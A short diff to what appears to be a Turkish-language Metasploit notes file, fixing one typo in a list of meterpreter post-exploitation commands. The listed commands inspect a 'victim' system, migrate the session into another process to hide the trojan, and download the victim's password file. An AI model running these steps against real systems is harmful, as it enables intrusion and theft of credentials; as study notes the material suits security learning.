@@ -10,7 +10,7 @@
 > msf exploit(multi/handler) > sessions -1
 > meterpreter > background //geri gitmek için
 > meterpreter > sysinfo // hedef sistem hakkında bilgi almak için
-> meterpreter > help //kkurbana yapılabilecek saldırıları gösterir
+> meterpreter > help //kurbana yapılabilecek saldırıları gösterir
 > meterpreter > ps //hedef sistemde çalışan işlemleri (process) listelemek için
 > meterpreter > migrate 2824 // mevcut Meterpreter oturumunu başka bir çalışan process içine taşır.Yani payload artık yeni process içinde çalışır. 2824 açık olan çalışan process içinde trojenimizin id numarası
 > meterpreter > download mysecretpasswords.txt // kurbanın cihazındaki dosyayı kendi cihazına indirir
